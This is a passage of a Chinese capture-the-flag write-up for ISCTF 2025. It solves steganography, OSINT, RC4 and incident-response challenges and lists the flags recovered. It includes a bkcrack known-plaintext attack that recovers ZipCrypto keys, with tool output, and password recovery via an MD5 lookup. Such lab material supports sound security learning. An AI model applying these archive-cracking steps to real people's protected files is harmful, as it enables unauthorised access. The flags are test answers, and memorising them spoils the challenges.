<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(root㉿LAPTOP-BMERJF8L)-[/mnt/e/99]</span><br><span class="line">└─# <span class="built_in">echo</span> -n <span class="string">"flagggg1.zip"</span> &gt; plain</span><br><span class="line">./bkcrack.exe -C flagggg3.zip -c flagggg2.zip -p plain -o 30 -x 0 504B0304</span><br><span class="line">bkcrack 1.8.0 - 2025-08-18</span><br><span class="line">[22:28:11] Z reduction using 4 bytes of known plaintext</span><br><span class="line">100.0 % (4 / 4)</span><br><span class="line">[22:28:11] Attack on 1388313 Z values at index 37</span><br><span class="line">Keys: ae0c4b27 66c21cba b9a7958f</span><br><span class="line">10.1 % (139941 / 1388313)</span><br><span class="line">Found a solution. Stopping.</span><br><span class="line">You may resume the attack with the option: --continue-attack 139941</span><br><span class="line">[22:29:19] Keys</span><br><span class="line">ae0c4b27 66c21cba b9a7958f</span><br><span class="line"></span><br><span class="line">(base) ┌──(root㉿LAPTOP-BMERJF8L)-[/mnt/e/99]</span><br><span class="line">└─# ./bkcrack.exe -C flagggg3.zip -c flagggg2.zip -k ae0c4b27 66c21cba b9a7958f -d flagggg2_decrypted.zip</span><br><span class="line">bkcrack 1.8.0 - 2025-08-18</span><br><span class="line">[22:32:50] Writing deciphered data flagggg2_decrypted.zip</span><br><span class="line">Wrote deciphered data (not compressed).</span><br></pre></td></tr></table></figure>
<p>要进攻flagggg2.zip把它弄出来，需要的是flagggg2.zip的明文即flagggg1.zip和50 4B 03 04</p>
<p>成功后得到flagggg2_decrypted.zip，剩下的没有密码，手动解压即可</p>
<p>得到flagggg.txt，<strong>ISCTF{3f165c87-c0d4-4903-9c47-3a8d3b9c83df}</strong></p>
<ul>
<li><p>星髓宝盒</p>
<blockquote>
<p>“什么什么什么，，，你竟然不知道什么是星髓宝盒！！！</p>
<p>星髓宝盒里的flag是只能留给优秀学生的奖励，优秀学生自会知道它的咒语！！！”</p>
</blockquote>
</li>
</ul>
<p>改后缀解压，得到星髓宝盒.png，pngcheck，发现有多余数据且binwalk分离失败</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost 1.png</span><br></pre></td></tr></table></figure>
<p>foremost分离，提取出来了一个zip，再直接解压</p>
<p>真-星髓宝盒.zip需要密码，flag应该就在里面。查看你是优秀学生吗.txt，明显0宽隐写</p>
<p><a target="_blank" rel="noopener" href="https://330k.github.io/misc_tools/unicode_steganography.html">https://330k.github.io/misc_tools/unicode_steganography.html</a></p>
<p>要多积累几个网站，这次碰到的就是双重隐写</p>
<p><a target="_blank" rel="noopener" href="https://www.guofei.site/pictures_for_blog/app/text_watermark/v1.html">文本隐水印</a>在这个网站成功去掉第一层零宽字符：‌‌‌‌‌</p>
<p>﻿‍‍‌‌‌‌‍‬‌‬‌‌‌‌‌﻿‌‬‌‌‌‌‌﻿‬‍‌‌‌‌‌﻿‬‌‌‌‌‌‍‬‍‍‌‌‌‌‌﻿‍‬‌‌‌‌‌﻿‬‌‌‌‌‌‌﻿‌﻿‌‌‌‌‌﻿‍‬你虽然能走到这一步‌‌‌‌‌﻿‬‍‌‌‌‌‌﻿‌‌‌‌‌‌‌﻿‌‬‌‌‌‌‌﻿‌‌‌‌‌‌‌﻿‬‍‌‌‌‌‌﻿‍‬‌‌‌‌‍‬‍‍‌‌‌‌‌﻿‬‍‌‌‌‌‌﻿‌﻿‌‌‌‌‌﻿‌‍‌‌‌‌‌﻿‍‬‌‌‌‌‌﻿‍﻿‌‌‌‌‌﻿‍‍‌‌‌‌‌﻿‍‬‌‌‌‌‍‬‍‌‌‌‌‌‌﻿‌﻿，‌‌‌‌‍‬‌‬‌‌‌‌‌﻿‍‍‌‌‌‌‌﻿‬‌但还不是优秀学生哦‌‌‌‌‍‬‍‍‌‌‌‌‍‬‌﻿，‌‌‌‌‌﻿‍‌flag是专属于优秀学生的奖励，优秀学生自会知道他的咒语</p>
<p>但是第二层又失败了，此时在<a target="_blank" rel="noopener" href="https://330k.github.io/misc_tools/unicode_steganography.html又成功去掉了第二层">https://330k.github.io/misc_tools/unicode_steganography.html又成功去掉了第二层</a></p>
<p>得到5b298e6836902096e9316756d3b58ec4</p>
<p>直接作为密码失败了，感觉像是md5，才想起来还有一个jpg没用上</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(root㉿LAPTOP-BMERJF8L)-[/mnt/e/baobao/output/zip/00001795]</span><br><span class="line">└─# exiftool 星髓宝盒.jpg</span><br><span class="line">ExifTool Version Number         : 13.25</span><br><span class="line">File Name                       : 星髓宝盒.jpg</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 286 kB</span><br><span class="line">File Modification Date/Time     : 2025:09:11 20:00:50+08:00</span><br><span class="line">File Access Date/Time           : 2025:12:09 14:59:17+08:00</span><br><span class="line">File Inode Change Date/Time     : 2025:12:09 14:57:13+08:00</span><br><span class="line">File Permissions                : -rwxrwxrwx</span><br><span class="line">File Type                       : JPEG</span><br><span class="line">File Type Extension             : jpg</span><br><span class="line">MIME Type                       : image/jpeg</span><br><span class="line">JFIF Version                    : 1.01</span><br><span class="line">Resolution Unit                 : inches</span><br><span class="line">X Resolution                    : 96</span><br><span class="line">Y Resolution                    : 96</span><br><span class="line">Exif Byte Order                 : Big-endian (Motorola, MM)</span><br><span class="line">Artist                          : 来杯冰美式！</span><br><span class="line">XP Comment                      : https://www.somd5.com/</span><br><span class="line">XP Author                       : 来杯冰美式！</span><br><span class="line">Padding                         : (Binary data 234 bytes, use -b option to extract)</span><br><span class="line">About                           : uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b</span><br><span class="line">Creator                         : 来杯冰美式！</span><br><span class="line">Image Width                     : 1024</span><br><span class="line">Image Height                    : 576</span><br><span class="line">Encoding Process                : Baseline DCT, Huffman coding</span><br><span class="line">Bits Per Sample                 : 8</span><br><span class="line">Color Components                : 3</span><br><span class="line">Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)</span><br><span class="line">Image Size                      : 1024x576</span><br><span class="line">Megapixels                      : 0.590</span><br></pre></td></tr></table></figure>
<p>exif数据发现一个网站<a target="_blank" rel="noopener" href="https://www.somd5.com/">https://www.somd5.com/</a></p>
<p>解密得到!!!@@@###123，难怪ARCHPR试了半天失败了，这密码当然爆破不出</p>
<p>解压得到flag.txt:<strong>ISCTF{1e7553787953e74113be4edfe8ca0e59}</strong></p>
<ul>
<li><p>阿利维亚的传说</p>
<blockquote>
<p>你知道阿利维亚的传说吗</p>
</blockquote>
</li>
</ul>
<p>解压得到png和docx，docx必考改zip解压</p>
<p>先看看png有什么异常，pngcheck有附加数据，binwalk分离出zip，直接解压需要密码，尝试爆破</p>
<p>ARCHPR秒出8652，得到</p>
<p>谕言3:<br>T=FMfr<br>R=iytY<br>U=nGFo<br>E=diou</p>
<p>看起来是第三段，FindMyGiftForYou</p>
<p>试一下zsteg，得到明显base64:6LCV6KiAMjoKVz1Ib2VpaApIPW91VGdvCmw9cE1oaGkKTD1lYWV0YwpFPVlrckNl</p>
<p>解密得到</p>
<p>è°è¨2:<br>W=Hoeih<br>H=ouTgo<br>l=pMhhi<br>L=eaetc<br>E=YkrCe</p>
<p>第二段是HopeYouMakeTherightChoice(注意r小写，做题时候没注意)</p>
<p>回看docx，先直接打开看看，提示（解出的每段flag后面加_,类似于flag1_flag2_flag3），那就找找flag1</p>
<p>改字体颜色没发现异常，解压查看，后面的交给Rycbartbad师傅了</p>
<p>/word下找到documents.xml，得到</p>
<p>谕言1:</p>
<p>V=Dortt</p>
<p>A=otuTa</p>
<p>N=NTsin</p>
<p>得到DoNotTrustTitan</p>
<p><strong>ISCTF{DoNotTrustTitan_HopeYouMakeTherightChoice_FindMyGiftForYou}</strong></p>
<ul>
<li><p>湖心亭看雪</p>
<blockquote>
<p>张岱在“雪”景中有感而发</p>
</blockquote>
</li>
</ul>
<p>看眼题干基本上就知道是snow隐写</p>
<p>点开py，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">b'*********'</span> <span class="comment">#这个东西你以后要用到</span></span><br><span class="line">b = <span class="string">b'blueshark'</span> </span><br><span class="line">c = <span class="built_in">bytes</span>([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)])</span><br><span class="line"><span class="built_in">print</span>(c.<span class="built_in">hex</span>())</span><br><span class="line"><span class="comment">#c = 53591611155a51405e</span></span><br></pre></td></tr></table></figure>
<p>解个密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="built_in">bytes</span>([<span class="number">83</span>, <span class="number">89</span>, <span class="number">22</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">90</span>, <span class="number">81</span>, <span class="number">64</span>, <span class="number">94</span>])</span><br><span class="line">b = <span class="built_in">bytes</span>([<span class="number">98</span>, <span class="number">108</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">107</span>])</span><br><span class="line">a = <span class="built_in">bytes</span>([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(c, b)])</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
<p>得到<strong>15ctf2025</strong></p>
<p>接下来看看jpg什么情况，exiftool全部正常，binwalk和foremost全部失效</p>
<p>拉进010editor看看，发现最后多了数据</p>
<p>14 00 09 00，补上50 4B 03 04保存为zip</p>
<p>加密了，输入15ctf2025解密得到txt</p>
<p>snow解密即可，密钥猜想仍是15ctf2025</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./SNOW.exe -C -p <span class="string">"15ctf2025"</span> flag.txt</span><br></pre></td></tr></table></figure>
<p><strong>ISCTF{y0U_H4v3_kN0wn_Wh4t_15_Sn0w!!!}</strong></p>
<h3 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a><strong>OSINT</strong></h3><ul>
<li><p>OSINT-1,OSINT-2，纯图寻题，Google识图即可，精确位置手动调一调</p>
</li>
<li><p>OSINT-3 </p>
<p>这题就比较传奇了，把图片喂给AI，感觉明显不是中国，一开始试过乌克兰、白俄罗斯、美国。很早Grok就怀疑是在哈萨克斯坦，但是不是优先项。试了几次之后ChatGPT怀疑是在哈萨克斯坦，才找到正确方向。</p>
</li>
</ul>
<p>  信息点1：左侧的大片麦田，而且连绵不绝</p>
<p>  信息点2：地上的车道分隔线是白色的</p>
<p>  信息点2可以排除大部分国家如America，有的国家大部分地方Google街景没有覆盖，可直接排除</p>
<p>  如果仔细观察，图片里面是有水印的，2024Google，所以在地图里面也可以根据水印快速排除</p>
<p>  <img src="/images/image-20251208234214270.png" alt=""></p>
<p>  第一处，点进去查看公路，环视一下感觉稳了，就沿着公路一直找，最后还是找到了</p>
<p>  一开始一直无法精确定位，后来想到可以借助途中左侧的一棵树，大致是西偏北30°，锁定了精确位置。</p>
<p>  <strong>ISCTF{immorally.misusing.began}</strong>54.32161512496924, 65.7630826261645</p>
<h3 id="SIGNIN"><a href="#SIGNIN" class="headerlink" title="SIGNIN"></a><strong>SIGNIN</strong></h3><ul>
<li><p>OSINT-4</p>
<blockquote>
<p>本题是放在SIGNIN类别下的OSINT主题的MISC类型的题，没有隐写，没有图寻。</p>
<p>OSINT系列通用靶机地址（请勿攻击平台）： </p>
<p><a target="_blank" rel="noopener" href="https://osint.imxbt.cn/">https://osint.imxbt.cn/</a><br><a target="_blank" rel="noopener" href="https://osint-isctf.aristore.top/">https://osint-isctf.aristore.top/</a></p>
</blockquote>
</li>
</ul>
<p>反复强调不是图寻,毕竟那张图上面随便标一个点，what3words的差别会巨大</p>
<p>很奇怪的是明明有附件，还给了OSINT网址，再联想到<strong>勇敢者的游戏</strong>，</p>
<p>是的，flag就是写在OSINT网站上的示例flag:ISCTF{like.crazy.thursdays}</p>
<p>不放心可以点开地图查查，确实是这儿</p>
<ul>
<li><p>老朋友、老朋友们和新朋友们</p>
<blockquote>
<p>。题的GALF到签取获ISCTF2025送发台后号众公息信鲨蓝向道一出会定肯年今FTCSI说里群在常们西东老</p>
</blockquote>
</li>
</ul>
<p>关注，发送5202FTCSI.<strong>ISCTF{0nce_M0re_With_Feeling_And_The_J0urney_C0ntinues!!}</strong></p>
<ul>
<li><p>小蓝鲨的RC4系统</p>
<blockquote>
<p>送都送了，再给一个。</p>
</blockquote>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StreamCipher</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key</span>):</span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">self</span>.S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">        <span class="variable language_">self</span>.i = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.j = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        key_bytes = <span class="variable language_">self</span>._key_to_bytes(key)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            j = (j + <span class="variable language_">self</span>.S[i] + key_bytes[i % <span class="built_in">len</span>(key_bytes)]) % <span class="number">256</span></span><br><span class="line">            <span class="variable language_">self</span>.S[i], <span class="variable language_">self</span>.S[j] = <span class="variable language_">self</span>.S[j], <span class="variable language_">self</span>.S[i]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_key_to_bytes</span>(<span class="params">self, key</span>):</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(key, <span class="built_in">str</span>):</span><br><span class="line">            <span class="keyword">return</span> hashlib.sha256(key.encode()).digest()</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(key, <span class="built_in">bytes</span>):</span><br><span class="line">            <span class="keyword">return</span> hashlib.sha256(key).digest()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_prga</span>(<span class="params">self</span>):</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">self</span>.i = (<span class="variable language_">self</span>.i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        <span class="variable language_">self</span>.j = (<span class="variable language_">self</span>.j + <span class="variable language_">self</span>.S[<span class="variable language_">self</span>.i]) % <span class="number">256</span></span><br><span class="line">        <span class="variable language_">self</span>.S[<span class="variable language_">self</span>.i], <span class="variable language_">self</span>.S[<span class="variable language_">self</span>.j] = <span class="variable language_">self</span>.S[<span class="variable language_">self</span>.j], <span class="variable language_">self</span>.S[<span class="variable language_">self</span>.i]</span><br><span class="line">        K = <span class="variable language_">self</span>.S[(<span class="variable language_">self</span>.S[<span class="variable language_">self</span>.i] + <span class="variable language_">self</span>.S[<span class="variable language_">self</span>.j]) % <span class="number">256</span>]</span><br><span class="line">        <span class="keyword">return</span> K</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">crypt</span>(<span class="params">self, data</span>):</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">str</span>):</span><br><span class="line">            data = data.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">        </span><br><span class="line">        result = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">            key_byte = <span class="variable language_">self</span>._prga()</span><br><span class="line">            result.append(byte ^ key_byte)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_string</span>(<span class="params">text, key</span>):</span><br><span class="line">    </span><br><span class="line">    cipher = StreamCipher(key)</span><br><span class="line">    encrypted = cipher.crypt(text)</span><br><span class="line">    <span class="keyword">return</span> encrypted.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">#ISCTF2025</span></span><br><span class="line"><span class="comment">#ba19a7116763ba8ba1c236c6bdc30187dcc8afb28c8fa5f266763880b74f5fff915613718f4d19c3baf4bbe24bd57303ce103d</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RC4Cipher</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key</span>):</span><br><span class="line">        <span class="variable language_">self</span>.S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">        <span class="variable language_">self</span>.i = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.j = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 密钥调度算法（KSA）</span></span><br><span class="line">        key_bytes = <span class="variable language_">self</span>._key_to_bytes(key)</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            j = (j + <span class="variable language_">self</span>.S[i] + key_bytes[i % <span class="built_in">len</span>(key_bytes)]) % <span class="number">256</span></span><br><span class="line">            <span class="variable language_">self</span>.S[i], <span class="variable language_">self</span>.S[j] = <span class="variable language_">self</span>.S[j], <span class="variable language_">self</span>.S[i]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_key_to_bytes</span>(<span class="params">self, key</span>):</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        将密钥转换为字节</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(key, <span class="built_in">str</span>):</span><br><span class="line">            <span class="keyword">return</span> hashlib.sha256(key.encode()).digest()</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(key, <span class="built_in">bytes</span>):</span><br><span class="line">            <span class="keyword">return</span> hashlib.sha256(key).digest()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">"密钥必须是字符串或字节"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_prga</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        伪随机生成算法，生成密钥流字节</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="variable language_">self</span>.i = (<span class="variable language_">self</span>.i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        <span class="variable language_">self</span>.j = (<span class="variable language_">self</span>.j + <span class="variable language_">self</span>.S[<span class="variable language_">self</span>.i]) % <span class="number">256</span></span><br><span class="line">        <span class="variable language_">self</span>.S[<span class="variable language_">self</span>.i], <span class="variable language_">self</span>.S[<span class="variable language_">self</span>.j] = <span class="variable language_">self</span>.S[<span class="variable language_">self</span>.j], <span class="variable language_">self</span>.S[<span class="variable language_">self</span>.i]</span><br><span class="line">        K = <span class="variable language_">self</span>.S[(<span class="variable language_">self</span>.S[<span class="variable language_">self</span>.i] + <span class="variable language_">self</span>.S[<span class="variable language_">self</span>.j]) % <span class="number">256</span>]</span><br><span class="line">        <span class="keyword">return</span> K</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">crypt</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">str</span>):</span><br><span class="line">            data = data.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(data, <span class="built_in">str</span>) <span class="keyword">and</span> data.startswith(<span class="string">'0x'</span>):</span><br><span class="line"></span><br><span class="line">            data = <span class="built_in">bytes</span>.fromhex(data.replace(<span class="string">'0x'</span>, <span class="string">''</span>))</span><br><span class="line">        </span><br><span class="line">        result = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">            key_byte = <span class="variable language_">self</span>._prga()</span><br><span class="line">            result.append(byte ^ key_byte)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_rc4</span>(<span class="params">ciphertext_hex, key</span>):</span><br><span class="line"></span><br><span class="line">    cipher = RC4Cipher(key)</span><br><span class="line">    ciphertext_bytes = <span class="built_in">bytes</span>.fromhex(ciphertext_hex)</span><br><span class="line">    plaintext_bytes = cipher.crypt(ciphertext_bytes)</span><br><span class="line">    <span class="keyword">return</span> plaintext_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_decrypt</span>(<span class="params">ciphertext_hex, key</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = decrypt_rc4(ciphertext_hex, key)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            decoded_text = result.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"解密结果(UTF-8): <span class="subst">{decoded_text}</span>"</span>)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"解密结果(hex): <span class="subst">{result.<span class="built_in">hex</span>()}</span>"</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"ASCII可打印字符:"</span>)</span><br><span class="line">        ascii_chars = <span class="string">''</span>.join(<span class="built_in">chr</span>(b) <span class="keyword">if</span> <span class="number">32</span> &lt;= b &lt;= <span class="number">126</span> <span class="keyword">else</span> <span class="string">'.'</span> <span class="keyword">for</span> b <span class="keyword">in</span> result)</span><br><span class="line">        <span class="built_in">print</span>(ascii_chars)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"解密失败: <span class="subst">{e}</span>"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主程序</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    key = <span class="string">"ISCTF2025"</span></span><br><span class="line">    ciphertext_hex = <span class="string">"ba19a7116763ba8ba1c236c6bdc30187dcc8afb28c8fa5f266763880b74f5fff915613718f4d19c3baf4bbe24bd57303ce103d"</span></span><br><span class="line"></span><br><span class="line">    plaintext = try_decrypt(ciphertext_hex, key)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"密文字节数: <span class="subst">{<span class="built_in">len</span>(<span class="built_in">bytes</span>.fromhex(ciphertext_hex))}</span>"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 显示密钥的SHA-256哈希</span></span><br><span class="line">    key_hash = hashlib.sha256(key.encode()).digest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"密钥SHA-256哈希: <span class="subst">{key_hash.<span class="built_in">hex</span>()}</span>"</span>)</span><br></pre></td></tr></table></figure>
<p><strong>ISCTF{Welcome<em>to_ISCTF</em>&amp;_this_is_a_secret_with_RC4}</strong></p>
<ul>
<li><p>我去，Flag是真的！？</p>
<p>随便交，可惜没找到彩蛋</p>
<p><strong>ISCTF{我要投递简历加入蓝鲨信息!}</strong></p>
</li>
</ul>
<ul>
<li><p>What a crazy day!! 之勇敢者的游戏</p>
<p>hint-50pts，但是你很勇敢，得到了349pts<strong>ISCTF{7hank<em>you</em>&amp;_now_you_can_win_3v3n_mor3!!}</strong></p>
</li>
</ul>
<h3 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a><strong>应急响应</strong></h3><ul>
<li><p>hacker</p>
<blockquote>
<p>hacker在数据库的某个后台写入了很多的垃圾用户(注册)，请提交其IP。 Flag使用ISCTF{}包裹。</p>
</blockquote>
</li>
</ul>
<p>hacker.pcapng拖到wireshark，http.request.uri contains “/register.php”过滤，于是<strong>ISCTF{192.168.37.177}</strong></p>
<p>这题一开始flag设置错误了，导致结果一直不对</p>
<ul>
<li><p>奇怪的shell文件</p>
<blockquote>
<p>小张同学是某安全团队的成员，负责公司服务器的日常安全检查。某天，他发现在一台关键业务服务器上存在异常行为，他的目标分析webshell连接工具，请提交工具名称作为flag以完成此次事件响应任务。 Flag使用ISCTF{}包裹。</p>
